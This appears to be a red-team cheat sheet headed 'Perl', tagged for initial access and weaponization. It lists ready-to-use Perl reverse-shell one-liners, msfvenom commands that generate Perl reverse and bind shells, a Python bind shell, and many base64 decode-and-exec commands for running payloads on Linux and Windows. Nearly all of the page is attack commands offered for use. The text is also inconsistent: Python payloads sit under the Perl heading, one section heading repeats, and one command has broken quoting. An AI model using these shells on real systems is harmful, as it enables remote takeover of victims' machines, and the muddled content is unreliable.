---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - perl
---
# Perl

> [!INFO] Preinstalled Interpreter
> The `perl` interpreter is preinstalled across all of the GNU/Linux operating systems.

## 01 - Base64 Encoded

Encode the python payload.

```
$ basenc -w 0 --base64 payload.pl

$ base64 -w 0 payload.pl

$ openssl enc -a -e -A -in payload.pl

$ openssl enc -base64 -A -in payload.pl
```

## 02 - Generate Payloads

### 2.1 - Linux

#### 2.1.1 - One-Liners

##### 2.1.1.1 - Reverse Shell

```
$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 2.2 - Linux

#### 2.2.1 - Generate a payload via `msfvenom`

##### 2.2.1.1 - Reverse Shells

Stageless TCP reverse shell.

```
$ msfvenom -p cmd/unix/reverse_perl lhost=<IP> lport=<PORT>
```

Stageless TLS reverse shell.

```
$ msfvenom -p cmd/unix/reverse_perl_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

##### 2.2.1.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_perl lport=<PORT>

$ msfvenom -p cmd/unix/bind_perl_ipv6 lport=<PORT>
```

#### 2.2.2 - One-liners

##### 2.2.2.1 - Reverse Shell

```
$ perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

##### 2.2.2.2 - Bind Shell

```
> python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

## 03 - Execute Payloads

> [!TIP]
> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload especially when the target is windows.

### 3.1 - Cross Platform

Single quote

```
> python -c 'exec "<base64_payload>".decode("base64")'
```

Double quote

```
> python -c "exec '<base64_payload>'.decode('base64')"

> python -c "exec( __import__('base64').decodestring('<base64_payload>'))"

> python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('<base64_payload>')))"
```

One-line Base64 (ANSI-C Quoting)

```
> python -c $'exec \'<base64_payload>\'.decode(\'base64\')'
```

One-line Base64

```
> python -c "exec \"<base64_payload>\".decode(\"base64\")"
```

### 3.2 - Linux

Single quote

```
$ echo "exec('<base64_payload>').decode('base64')) | python"
```

Heredoc Base64

```
$ python - << EOF
exec '<base64_payload>'.decode('base64')
EOF

$ python - << EOF
exec "<base64_payload>".decode("base64")
EOF
```

### 3.3 - Windows

Single quote

```
> py -c 'exec "<base64_payload>".decode("base64")'
```

Double quote

```
> py -c "exec '<base64_payload>'.decode('base64')"

> py -c "exec( __import__('base64').decodestring('<base64_payload>'))"

> py -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]]('<base64_payload>')))"
```

One-line Base64 (ANSI-C Quoting)

```
> py -c $'exec \'<base64_payload>\'.decode(\'base64\')'
```

One-line Base64

```
> py -c "exec \"<base64_payload>\".decode(\"base64\")"
```

---
## References

### GTFOBins

- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

### don't code me on that

- [don't code me on that: Python Reverse Shells](https://medium.com/dont-code-me-on-that/bunch-of-shells-python-b3fb1400b823)

### PuckieStyle

- [PuckieStyle: Python one-line b64 Shellcode](https://www.puckiestyle.nl/python-one-line-shellcode/)

### Pentest Monkey

- [Reverse Shell Cheatsheet Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)